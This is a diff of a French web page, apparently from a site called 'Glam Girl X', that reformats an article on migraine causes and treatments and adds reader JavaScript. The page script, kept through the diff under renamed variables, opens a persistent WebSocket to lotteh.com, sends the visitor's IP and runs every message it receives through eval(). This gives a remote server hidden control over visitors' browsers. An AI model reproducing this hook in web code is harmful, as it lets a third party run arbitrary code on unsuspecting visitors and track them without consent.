@@ -65,7 +65,7 @@
               <a class="nav-link" href="/fr/landing" title="Visitez la page de destination">Atterrissage</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Chat vidéo">Chat</a>
+              <a class="nav-link" href="/fr/chat" title="Chat vidéo">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/fr/private" title="Voir des photos privées avec une clé">Privé</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyPhoto de profil" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Par Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Quelles sont les causes de la migraine et comment sont-elles traitées? </p> <p> <br> </p> <p> Les migraines sont des maux de tête graves qui sont souvent accompagnés d'autres symptômes tels que les nausées, la sensibilité à la lumière et au son,et des perturbations visuelles.La cause exacte des migraines n'est pas entièrement comprise, mais il est censé être lié à des changements dans le flux sanguin et les produits chimiques dans le cerveau. </p> <p> <br> </p> <p> Le traitement des migraines implique généralementUne combinaison de changements de style de vie, de médicaments et de thérapies alternatives.Certaines options de traitement courantes comprennent: </p> <p> <br> </p> <p> 1.Prendre des analgésiques en vente libre tels que l'ibuprofène ou l'acétaminophène </p> <p> 2.Les médicaments sur ordonnance spécialement conçus pour traiter les migraines, tels que les triptans ou les ergotamines </p> <p> 3.Éviter les déclencheurs tels que certains aliments, le stress, le manque de sommeil ou les changements hormonaux </p> <p> 4.Pratiquer des techniques de relaxation telles que la respiration profonde ou la méditation </p> <p> 5.Appliquer des packs chauds ou froids sur la tête ou le cou </p> <p> 6.Être régulierfaire de l'exercice et maintenir une alimentation saine </p> <p> <br> </p> <p> Il est important pour les personnes qui souffrent de migraines pour travailler avec leur fournisseur de soins de santé pour développer un plan de traitement adapté à leurs besoins spécifiqueset déclenche.Dans certains cas, une combinaison de thérapies peut être nécessaire pour gérer efficacement les migraines et améliorer la qualité de</div>
+<div style="white-space: pre-wrap;"><p>Qu'est-ce qui cause la migraine et comment sont-ils traités?</p><p><br/></p><p>Les migraines sont des maux de tête graves qui s'accompagnent souvent d'autres symptômes tels que les nausées, la sensibilité à la lumière et au son et des perturbations visuelles. La cause exacte des migraines n'est pas entièrement comprise, mais il est censé être lié à des changements dans le flux sanguin et aux produits chimiques dans le cerveau.</p><p><br/></p><p>Le traitement des migraines implique généralement une combinaison de changements de style de vie, de médicaments et de thérapies alternatives. Certaines options de traitement courantes comprennent:</p><p><br/></p><p>1. Prendre des analgésiques en vente libre comme l'ibuprofène ou l'acétaminophène</p><p>2. Médicaments de prescription spécialement conçus pour traiter les migraines, comme les triptans et les ergotamines</p><p>3. Éviter les déclencheurs tels que certains aliments, le stress, le manque de sommeil ou les changements hormonaux</p><p>4. Pratiquer des techniques de relaxation telles que la respiration ou la méditation profonde</p><p>5. Appliquer des packs chauds ou froids sur la tête ou le cou</p><p>6. faire de l'exercice régulier et maintenir une alimentation saine</p><p><br/></p><p>Il est important pour les personnes qui souffrent de migraines de travailler avec leur fournisseur de soins de santé pour élaborer un plan de traitement adapté à leurs besoins et déclencheurs spécifiques. Dans certains cas, une combinaison de thérapies peut être nécessaire pour gérer efficacement les migraines et améliorer la qualité de vie.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
